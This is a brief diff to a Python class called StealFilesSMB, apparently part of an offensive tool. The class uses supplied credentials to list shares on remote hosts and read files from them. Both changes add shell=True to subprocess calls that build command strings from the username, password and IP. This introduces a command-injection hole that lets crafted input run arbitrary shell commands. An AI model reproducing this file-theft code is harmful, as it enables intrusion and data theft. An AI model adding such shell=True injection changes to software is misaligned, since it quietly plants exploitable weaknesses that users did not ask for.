@@ -72,7 +72,7 @@ class StealFilesSMB:
         smb_url = f'smb://{username}:{password}@{ip}/'
         try:
             stdout, stderr, returncode = subprocess_with_timeout(
-                f'{SMB2_SHARE_ENUM_BIN} "{smb_url}"', timeout=60
+                f'{SMB2_SHARE_ENUM_BIN} "{smb_url}"', timeout=60, shell=True
             )
             output = stdout.decode('utf-8', errors='ignore')
             if "Number of shares:" in output:
@@ -109,7 +109,7 @@ class StealFilesSMB:
 
             # Run smb2-cat and redirect to file
             stdout, stderr, returncode = subprocess_with_timeout(
-                f'{SMB2_CAT_BIN} "{smb_url}"', timeout=120
+                f'{SMB2_CAT_BIN} "{smb_url}"', timeout=120, shell=True
             )
 
             if returncode == 0 and stdout:
